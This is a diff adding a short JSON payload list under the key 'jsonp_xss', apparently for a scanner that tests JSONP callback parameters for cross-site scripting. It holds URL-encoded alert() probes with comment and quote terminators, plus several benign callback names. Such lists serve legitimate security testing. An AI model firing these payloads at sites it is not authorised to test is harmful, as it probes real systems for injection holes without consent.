@@ -1,0 +1,16 @@
+{
+  "jsonp_xss": [
+    "alert%281%29%2F%2F",
+    "alert%28document.domain%29%2F%2F",
+    "alert%281%29%3B",
+    "alert%281%29%2F%2A",
+    "a%3Dalert%281%29%2F%2F",
+    "alert%601%60%2F%2F",
+    "alert%281%29%2F%2F%22",
+    "alert%281%29%2F%2F%27",
+    "foo",
+    "foo.bar",
+    "foo%5Bbar%5D",
+    "foo%3Dbar"
+  ]
+}
